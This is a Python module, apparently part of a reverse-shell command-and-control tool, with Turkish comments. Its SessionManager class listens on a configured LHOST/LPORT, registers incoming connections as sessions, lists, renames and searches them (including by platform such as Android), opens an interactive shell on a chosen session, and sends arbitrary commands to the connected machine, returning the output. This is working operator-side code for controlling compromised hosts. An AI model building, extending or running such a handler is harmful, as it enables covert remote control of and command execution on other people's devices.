import socket
import threading
from .config import CONFIG
from .handler import handle_new_connection
from .registry import session_counter, list_sessions, get_session, remove_session
from .utils import print_info, print_success, print_error
from .logger import log
from .registry import set_session_name, get_session_name

class SessionManager:
    def __init__(self):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.active = False
        
    def rename_session(self, session_id, new_name):
        if set_session_name(session_id, new_name):
            print(f"[+] Session {session_id} renamed to '{new_name}'")
        else:
            print(f"[!] Session {session_id} not found")
           
    def set_timeout(self, seconds):
        try:
            seconds = int(seconds)
            from .config import CONFIG
            CONFIG["TIMEOUT"] = seconds
            print(f"[+] Response timeout set to {seconds} seconds.")
        except Exception:
            print("[!] Invalid timeout value.")
           
    def search_sessions(self, filter_str):
        # Basit örnek: 'platform:android' benzeri filtre araması
        results = []
        for sid, sess in list_sessions().items():
            # Örnek olarak sadece IP ile filtre yapalım:
            if filter_str in sess.addr[0]:
                results.append((sid, sess))
        if results:
            print("[*] Search Results:")
            for sid, sess in results:
                print(f"#{sid} {sess.addr[0]}:{sess.addr[1]}")
        else:
            print("[!] No sessions matched the filter.")
            
    def start_listener(self):
        self.listener.bind((CONFIG["LHOST"], CONFIG["LPORT"]))
        self.listener.listen()
        self.active = True
        print_success(f"Listening on {CONFIG['LHOST']}:{CONFIG['LPORT']}")
        threading.Thread(target=self.accept_loop).start()

    def accept_loop(self):
        from .registry import session_counter, increment_session_id
        while self.active:
            conn, addr = self.listener.accept()
            session_id = increment_session_id()
            handle_new_connection(conn, addr, session_id)

    def list_sessions(self):
        print_info("Active sessions:")
        for sid, session in list_sessions().items():
            status = "ALIVE" if session.alive else "DEAD"
            print(f"#{sid} -> {session.addr[0]}:{session.addr[1]} :: {status}")

    def interact(self, session_id):
        session = get_session(session_id)
        if session and session.alive:
            session.shell.interact()
        else:
            print_error(f"Session {session_id} is not active.")

    def send_command(self, session_id, command):
        session = get_session(session_id)
        if session and session.alive:
            session.conn.sendall(command.encode())
            response = session.conn.recv(CONFIG["BUFFER_SIZE"]).decode()
            return response
        return None